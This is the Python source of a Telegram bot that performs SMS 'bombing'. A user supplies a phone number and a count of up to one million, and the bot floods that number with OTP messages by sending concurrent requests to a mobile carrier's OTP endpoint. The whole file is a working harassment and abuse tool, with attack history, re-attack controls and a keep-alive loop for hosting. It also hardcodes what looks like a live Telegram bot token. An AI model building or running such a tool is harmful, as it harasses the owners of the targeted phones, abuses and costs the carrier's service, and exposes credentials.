import asyncio
import aiohttp
import telebot
import time
import json
import os
import logging
import psutil
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web 
from datetime import datetime
import pytz

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
WAKEUP_URL = "https://rkbombx.onrender.com" 
DB_FILE = "rk_users_v15.json"
HISTORY_FILE = "rk_history_v15.json"
SYSTEM_STATS_FILE = "rk_system_stats.json"

logging.basicConfig(level=logging.INFO)
bot = AsyncTeleBot(API_TOKEN)
TZ = pytz.timezone('Asia/Dhaka')

# Global Variables
active_attacks = {}  
user_states = {}
authorized_users = {ADMIN_ID}
attack_history = []
global_sms_count = 0

# --- DATA PERSISTENCE ---
def load_all_data():
    global authorized_users, attack_history, global_sms_count
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, "r") as f: authorized_users = set(json.load(f))
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE, "r") as f: attack_history = json.load(f)
        if os.path.exists(SYSTEM_STATS_FILE):
            with open(SYSTEM_STATS_FILE, "r") as f:
                stats = json.load(f)
                global_sms_count = stats.get("total_sent", 0)
    except Exception as e:
        logging.error(f"Data loading error: {e}")

def save_data():
    try:
        with open(DB_FILE, "w") as f: json.dump(list(authorized_users), f, indent=4)
        with open(HISTORY_FILE, "w") as f: json.dump(attack_history[-100:], f, indent=4)
        with open(SYSTEM_STATS_FILE, "w") as f: json.dump({"total_sent": global_sms_count}, f, indent=4)
    except Exception as e:
        logging.error(f"Data saving error: {e}")

# --- RENDER ALIVE & HEALTH ---
async def keep_alive():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(WAKEUP_URL) as resp:
                    logging.info(f"Pulse Sent: {resp.status}")
            except: pass
            await asyncio.sleep(300)

async def handle_health_check(request):
    return web.Response(text="<h1>RK BOT IS RUNNING STYLISHLY! 🚀</h1>", content_type='text/html')

async def start_health_server():
    app = web.Application()
    app.router.add_get('/', handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# --- UI HELPERS ---
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "📜 Attack History", "⏳ Running List", "💎 My Status", "📊 System Info", "📞 Support")
    return markup

def get_control_panel(chat_id, status, target=None):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if status == "running" else "▶️ Resume"
    p_callback = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
    markup.add(types.InlineKeyboardButton(p_text, callback_data=p_callback),
               types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}"))
    if status == "completed" and target:
        markup.add(types.InlineKeyboardButton("🔄 Re-Attack", callback_data=f"re_{target}"))
    return markup

# --- CORE ENGINE ---
async def perform_sms(session, number, stats):
    global global_sms_count
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=10) as resp:
            if resp.status == 200:
                stats['ok'] += 1
                global_sms_count += 1
            else: stats['err'] += 1
    except: stats['err'] += 1
    stats['total'] += 1

async def attack_orchestrator(chat_id, message_id, target, limit):
    evt = asyncio.Event()
    evt.set()
    start_time = datetime.now(TZ)
    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False, 'target': target}
    
    stats = {'ok': 0, 'err': 0, 'total': 0}
    
    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            if active_attacks.get(chat_id, {}).get('stop'): break
            if not evt.is_set(): await evt.wait()
            
            # High speed batching
            batch_size = 30 
            batch = min(batch_size, limit - stats['total'])
            tasks = [perform_sms(session, target, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)
            
            try:
                prog = int((stats['total']/limit)*100)
                bar_count = prog // 10
                bar = "🔹" * bar_count + "▫️" * (10 - bar_count)
                current_time = datetime.now(TZ)
                elapsed = int((current_time - start_time).total_seconds())
                
                # MONITOR STYLE (EXACTLY AS REQUESTED)
                monitor_txt = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 Target: `{target}`\n"
                    f"📊 Progress: `{prog}%` {bar}\n"
                    f"✅ Success: `{stats['ok']}` ]\n"
                    f"❌ Fail: `{stats['err']}` ]\n"
                    f"🔢 Total Sent: `{stats['total']}/{limit}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🕒 Started: `{start_time.strftime('%I:%M:%S %p | %d-%m-%Y')}` ]\n"
                    f"⏳ Running_Time: `{elapsed}s` ]\n"
                    f"📡 STATUS: `{active_attacks[chat_id]['status'].upper()}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
                
                await bot.edit_message_text(monitor_txt, chat_id, message_id, 
                                          reply_markup=get_control_panel(chat_id, active_attacks[chat_id]['status']),
                                          parse_mode="Markdown")
            except: pass
            await asyncio.sleep(0.8) # Faster updates

    active_attacks[chat_id]['status'] = 'completed'
    attack_history.append({"target": target, "count": stats['ok'], "time": datetime.now(TZ).strftime('%d-%m %I:%M %p')})
    save_data()
    
    final_msg = f"🏁 **ATTACK FINISHED** 🏁\n━━━━━━━━━━━━━━\n📱 Target: `{target}`\n✅ Successfully Sent: `{stats['ok']}`"
    await bot.send_message(chat_id, final_msg, reply_markup=get_main_menu())
    active_attacks.pop(chat_id, None)

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
async def start(m):
    welcome = (f"🔥 **RK BOMBING V15.2 PRO** 🔥\n\n"
               f"বট এখন সুপার ফাস্ট! ১,০০০,০০০ লিমিট আনলক করা হয়েছে।\n"
               f"নিচের বাটন চেপে শুরু করুন।")
    await bot.send_message(m.chat.id, welcome, reply_markup=get_main_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
async def ask_num(m):
    if m.chat.id not in authorized_users: 
        return await bot.reply_to(m, "🚫 **Access Denied!**")
    user_states[m.chat.id] = {"step": "num"}
    await bot.send_message(m.chat.id, "📞 **টার্গেট নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: m.chat.id in user_states and user_states[m.chat.id].get("step") == "num")
async def get_num(m):
    if len(m.text) == 11 and m.text.isdigit():
        user_states[m.chat.id] = {"step": "limit", "target": m.text}
        await bot.send_message(m.chat.id, "🔢 **আক্রমণের পরিমাণ দিন (সর্বোচ্চ ১,০০০,০০০):**")
    else:
        await bot.reply_to(m, "❌ ভুল নম্বর!")

@bot.message_handler(func=lambda m: m.chat.id in user_states and user_states[m.chat.id].get("step") == "limit")
async def get_lim(m):
    try:
        limit = int(m.text)
        if limit > 1000000: limit = 1000000 # Limit set to 1 million
        
        target = user_states[m.chat.id]['target']
        user_states.pop(m.chat.id)
        
        msg = await bot.send_message(m.chat.id, "⚡ **ইঞ্জিন লোড হচ্ছে...**")
        asyncio.create_task(attack_orchestrator(m.chat.id, msg.message_id, target, limit))
    except:
        await bot.reply_to(m, "⚠️ শুধুমাত্র সংখ্যা দিন!")

@bot.message_handler(func=lambda m: m.text == "📊 System Info")
async def sys_info(m):
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    txt = (f"🖥 **SYSTEM ANALYTICS**\n━━━━━━━━━━━━━━\n"
           f"⚡ CPU: `{cpu}%` | 🧠 RAM: `{ram}%` \n"
           f"📨 Total Sent: `{global_sms_count}`\n"
           f"⏳ Active Threads: `{len(active_attacks)}` \n"
           f"🚀 Bot Version: `V15.2 PRO` \n"
           f"━━━━━━━━━━━━━━")
    await bot.reply_to(m, txt)

@bot.callback_query_handler(func=lambda c: True)
async def cb(c):
    cid = c.message.chat.id
    if c.data.startswith("pau_"):
        if cid in active_attacks:
            active_attacks[cid]['event'].clear()
            active_attacks[cid]['status'] = "paused"
            await bot.answer_callback_query(c.id, "Paused ⏸")
    elif c.data.startswith("res_"):
        if cid in active_attacks:
            active_attacks[cid]['event'].set()
            active_attacks[cid]['status'] = "running"
            await bot.answer_callback_query(c.id, "Resumed ▶️")
    elif c.data.startswith("stp_"):
        if cid in active_attacks:
            active_attacks[cid]['stop'] = True
            active_attacks[cid]['event'].set()
            await bot.answer_callback_query(c.id, "Stopped ⏹")

# --- RUNNER ---
async def main():
    load_all_data()
    print("RK V15.2 PRO is online!")
    await asyncio.gather(
        start_health_server(),
        keep_alive(),
        bot.polling(non_stop=True)
    )

if __name__ == "__main__":
    asyncio.run(main())
